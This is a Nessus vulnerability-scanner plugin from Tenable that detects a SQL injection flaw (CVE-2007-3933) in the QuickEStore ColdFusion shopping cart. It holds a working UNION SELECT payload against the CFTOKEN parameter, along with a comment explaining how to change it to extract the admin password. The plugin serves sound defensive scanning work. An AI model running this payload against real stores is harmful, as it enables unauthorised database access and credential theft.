#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(26001);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2007-3933");
  script_bugtraq_id(24961);
  script_osvdb_id(36358);
  script_xref(name:"EDB-ID", value:"4193");

  script_name(english:"QuickEStore insertorder.cfm CFTOKEN Parameter SQL Injection");
  script_summary(english:"Tries to get QuickEStore store's name via SQL injection");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Cold Fusion script that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running QuickEStore, a shopping cart application
writtein in Cold Fusion. 

The version of QuickEStore installed on the remote host fails to
sanitize input to the 'CFTOKEN' parameter of the 'insertorder.cfm'
script before using it in database queries.  An unauthenticated
attacker can exploit this issue to manipulate database queries, which
may lead to disclosure of sensitive information (such as the store's
administrative password), modification of data, or attacks against the
underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/09/07");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/07/19");
 script_cvs_date("$Date: 2016/05/19 17:53:34 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/store", "/shop", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to retrieve the store's name. Change
  # "storename" to "password" to return the admin password!
  exploit = string('1 UNION SELECT 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from Params"having 1=1');
  u = string(
      dir, "/insertorder.cfm?",
      "CFID=1&",
      "CFTOKEN=", urlencode(str:exploit)
    );
  r = http_send_recv3(method: "GET", port:port, item: u);
  if (isnull(r)) exit(0);
  res = r[2];
  # If it looks like the exploit worked...
  if ("Calculate item total" >< res)
  {
    # Grab the value.
    value = NULL;

    pat = 'name="att2" value="([^"]+)">';
    matches = egrep(pattern:pat, string:res);
    foreach match (split(matches))
    {
      match = chomp(match);
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        value = item[1];
        break;
      }
    }

    # There's a problem if we have it.
    if (value)
    {
      report = string(
        "\n",
        "Nessus was able to exploit this vulnerability to retrieve the store's\n",
        "name (", value, ")."
      );
      security_hole(port:port, extra:report);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
